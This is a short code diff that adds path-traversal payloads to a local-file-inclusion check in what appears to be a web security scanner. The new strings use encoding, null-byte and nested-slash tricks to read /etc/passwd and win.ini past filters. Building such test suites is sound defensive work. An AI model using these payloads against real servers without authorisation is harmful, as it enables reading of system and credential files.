@@ -7,8 +7,16 @@ def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
     Local File Inclusion
     """
     payloads = [
+        # Standard
         "../../../../etc/passwd",
         "../../../../windows/win.ini",
+        
+        # Bypasses (Encoding / Null Byte / WAF Tricks)
+        "..%2f..%2f..%2f..%2fetc/passwd", # URL Encoded
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", # Double Encoded
+        "../../../../../../../../../../../etc/passwd%00", # Null Byte
+        "....//....//....//etc/passwd", # Nested Dot Slash
+        "..;/..;/..;/etc/passwd", # Nginx Off-by-one / TomCat
     ]
     fields = scenario.config.get("fields", ["file", "path"])
     issues = []
